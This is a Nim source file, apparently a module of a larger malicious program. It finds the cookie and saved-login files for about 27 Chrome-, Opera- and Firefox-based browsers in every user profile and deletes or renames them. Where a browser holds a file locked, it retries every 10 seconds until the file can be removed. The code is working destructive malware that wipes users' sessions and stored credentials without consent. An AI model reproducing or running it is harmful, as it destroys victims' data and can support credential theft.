from os import sleep
from os import `/`
from os import getEnv
from os import walkDir
from os import PathComponent
from os import existsDir
from os import existsFile

from strutils import startsWith

from ../flags import BROWSER_THREAD_REMOVE_FILE

when BROWSER_THREAD_REMOVE_FILE:
  from os import tryRemoveFile
else:
  from os import moveFile

type
  BROWSER_TYPES = enum
    CHROME_BASED
    OPERA_BASED # still CHROME_BASED but uses a diferent file structure
    FIREFOX_BASED
  browserType = tuple[based: BROWSER_TYPES, folders: seq[string]]
  browserThreadArgs = tuple[
    based: BROWSER_TYPES,
    folder: string,
    appdata: string,
    localappdata: string
  ]
  browserThreadType = Thread[browserThreadArgs]


const browsers: seq[browserType] = @[
  (
    CHROME_BASED,
    @[
      r"Google\Chrome",
      r"Microsoft\Edge",
      r"7Star\7Star",
      r"Amigo",
      r"BraveSoftware\Brave-Browser",
      r"CentBrowser",
      r"Chedot",
      r"Google\Chrome SxS",
      r"Chromium",
      r"CocCoc\Browser",
      r"Comodo\Dragon",
      r"Elements Browser",
      r"Epic Privacy Browser",
      r"Kometa",
      r"Orbitum",
      r"Sputnik\Sputnik",
      r"Torch",
      r"uCozMedia\Uran",
      r"Vivaldi",
      r"Yandex\YandexBrowse"
    ]
  ),
  (
    OPERA_BASED,
    @[
      r"Opera Software\Opera Stable"
    ]
  ),
  (
    FIREFOX_BASED,
    @[
      r"Mozilla\Firefox\Profiles",
      r"NETGATE Technologies\BlackHawk",
      r"8pecxstudios\Cyberfox",
      r"Comodo\IceDragon",
      r"K-Meleon,",
      r"Mozilla\icecat"
    ]
  ),
]

proc getNoOfThreads(): int =
  for b in browsers:
    for f in b.folders:
      result += 1

const noOfThreads: int = getNoOfThreads()

proc removeFileOrSleep(src: string, doSleep: bool = false): void =
  const sleepTime: int = 10 # 10 secs

  if doSleep:
    sleep(sleepTime * 1000)

  var worked: bool = true

  when BROWSER_THREAD_REMOVE_FILE:
    worked = tryRemoveFile(src)
  else:
    try:
      # rename file from `x` to `x_`
      moveFile(src, src & "_")
    except OSError:
      removeFileOrSleep(src, true)

  if not worked:
    # try to remove file every `sleepTime` secs
    # am nev de asta pt ca daca browserul este deschis
    # nu pot sterge fisierul
    removeFileOrSleep(src, true)

proc initSearchThread(args: browserThreadArgs): void {.thread.} =
  let (based, folder, appdata, localappdata) = args

  var
    fullFolder: string = ""
    files: seq[string] = @[]

  case based
  of CHROME_BASED, OPERA_BASED:
    let isOpera: bool = based == OPERA_BASED

    fullFolder =
      if isOpera:
        appdata / folder
      else:
        localappdata / folder / "User Data"

    if existsDir(fullFolder):
      # add default user data
      files.add r"Default\Cookies"
      files.add r"Default\Login Data"

      for kind, maybeProfile in walkDir(fullFolder, true):
        if kind == pcDir:
          # if maybeProfile is a profile
          if maybeProfile.startsWith("Profile"):
            # maybeProfile is now for sure a profile
            files.add maybeProfile / "Cookies"
            files.add maybeProfile / "Login Data"

  of FIREFOX_BASED:
    fullFolder = appdata / folder

    if existsDir(fullFolder):
      for kind, profile in walkDir(fullFolder, true):
        if kind == pcDir:
          files.add profile / "cookies.sqlite"
          files.add profile / "logins.json"

  for file in files:
    let fullPath: string = fullFolder / file

    if existsFile(fullPath):
      # echo fullPath
      removeFileOrSleep(fullPath)


proc initBrowserThread*(): void {.thread.} =
  let
    appdata: string = getEnv("appdata")
    localappdata: string = getEnv("localappdata")

  var
    threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
    i = 0
  for browser in browsers:
    for folder in browser.folders:
      createThread(threads[i], initSearchThread, (browser.based,
          folder, appdata, localappdata))
      i += 1

  joinThreads(threads)

# initBrowserThread()
